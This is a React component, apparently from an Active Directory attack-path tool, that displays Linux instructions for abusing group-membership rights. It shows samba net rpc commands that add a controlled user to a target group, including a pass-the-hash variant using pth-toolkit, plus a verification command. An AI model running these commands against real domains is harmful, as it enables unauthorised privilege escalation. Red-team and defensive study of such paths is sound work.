import React from 'react';
import PropTypes from "prop-types";

const LinuxAbuse = ({ sourceName, sourceType }) => {
    return (
        <>
            <p>
                Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
                or prompted interactively if omitted from the command line:
            </p>

            <pre>
                <code>
                    {
                        'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                    }
                </code>
            </pre>

            <p>
                Pass-the-hash can also be done here with <a href='https://github.com/byt3bl33d3r/pth-toolkit'>pth-toolkit's net tool</a>.
                If the LM hash is not known it must be replace with <code>ffffffffffffffffffffffffffffffff</code>.
            </p>

            <pre>
                <code>
                    {
                        'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                    }
                </code>
            </pre>

            <p>
                Finally, verify that the user was successfully added to the group:
            </p>

            <pre>
                <code>
                    {
                        'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                    }
                </code>
            </pre>
        </>
    );
};

LinuxAbuse.propTypes= {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string
}

export default LinuxAbuse;
